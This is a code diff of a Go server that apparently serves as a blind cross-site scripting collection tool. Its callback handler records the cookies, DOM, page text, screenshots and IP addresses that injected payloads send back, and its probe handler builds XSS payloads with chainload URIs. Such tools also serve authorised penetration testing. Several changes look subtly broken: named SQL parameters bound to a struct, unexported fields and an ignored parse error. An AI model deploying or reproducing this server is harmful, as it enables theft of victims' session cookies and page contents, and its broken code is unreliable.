@@ -7,7 +7,7 @@ import (
 	"image/jpeg"
 	"os"
 	"regexp"
-	"strings"
+	"strconv"
 
 	"net/http"
 
@@ -127,31 +127,35 @@ func jscallbackHandler(w http.ResponseWriter, r *http.Request) {
 				}
 	*/
 	payload_fire_id := uuid.New().String()
-	payload_fire_data := map[string]string{
-		"id":                 payload_fire_id,
-		"url":                r.FormValue("uri"),
-		"ip_address":         r.RemoteAddr,
-		"referer":            r.FormValue("referrer"),
-		"user_agent":         r.UserAgent(),
-		"cookies":            r.FormValue("cookies"),
-		"title":              r.FormValue("title"),
-		"dom":                r.FormValue("dom"),
-		"text":               r.FormValue("text"),
-		"origin":             r.FormValue("origin"),
-		"screenshot_id":      payload_fire_image_id,
-		"was_iframe":         r.FormValue("was_iframe"),
-		"browser_timestamp":  r.FormValue("browser-time"),
-		"correlated_request": "No correlated request found for this injection.",
+	browser_time, err := strconv.ParseUint(r.FormValue("browser-time"), 10, 64)
+	payload_fire_data := PayloadFireResults{
+		ID:                 payload_fire_id,
+		url:                r.FormValue("uri"),
+		ip_address:         r.RemoteAddr,
+		referer:            r.FormValue("referrer"),
+		user_agent:         r.FormValue("user-agent"),
+		cookies:            r.FormValue("cookies"),
+		title:              r.FormValue("title"),
+		dom:                r.FormValue("dom"),
+		text:               r.FormValue("text"),
+		origin:             r.FormValue("origin"),
+		screenshot_id:      payload_fire_image_id,
+		was_iframe:         r.FormValue("was_iframe") == "true",
+		browser_timestamp:  uint(browser_time),
+		correlated_request: "No correlated request found for this injection.",
 	}
 
 	db := establish_database_connection()
 
-	// correlated_request_rec = db // Find one at injection_requests injection key exsits from req.body.injection_key
-	// if correlated_request_rec != nil {
-	// 	payload_fire_data["correlated_request"] = correlated_request_rec.request
-	// }
+	var correlated_request_rec string
+	db.QueryRow("SELECT request FROM injection_requests WHERE injection_key = ?", r.FormValue("injection_key")).Scan(&correlated_request_rec)
+	if correlated_request_rec != "" {
+		payload_fire_data.correlated_request = correlated_request_rec
+	}
 
-	db.Create(&payload_fire_data)
+	// Insert the payload_fire_data into the database
+	_, err = db.Exec(`INSERT INTO payload_fire_results (id, url, ip_address, referer, user_agent, cookies, title, dom, text, origin, screenshot_id, was_iframe, browser_timestamp) 
+	VALUES (:id, :url, :ip_address, :referer, :user_agent, :cookies, :title, :dom, :text, :origin, :screenshot_id, :was_iframe, :browser_timestamp)`, payload_fire_data)
 
 	send_notification()
 }
@@ -172,10 +176,10 @@ func probeHandler(w http.ResponseWriter, r *http.Request) {
 	xss_payload_1 := re.ReplaceAllString(string(probe), "https://"+r.Host)
 
 	re = regexp.MustCompile(`\[COLLECT_PAGE_LIST_REPLACE_ME\]`)
-	xss_payload_2 := re.ReplaceAllString(xss_payload_1, strings.Join(college_pages, ","))
+	xss_payload_2 := re.ReplaceAllString(xss_payload_1, college_pages)
 
 	re = regexp.MustCompile(`\[CHAINLOAD_REPLACE_ME\]`)
-	xss_payload_3 := re.ReplaceAllString(xss_payload_2, strings.Join(chainload_uri, ","))
+	xss_payload_3 := re.ReplaceAllString(xss_payload_2, chainload_uri)
 
 	re = regexp.MustCompile(`\[PROBE_ID\]`)
 	xss_payload_4 := re.ReplaceAllString(xss_payload_3, probe_id)
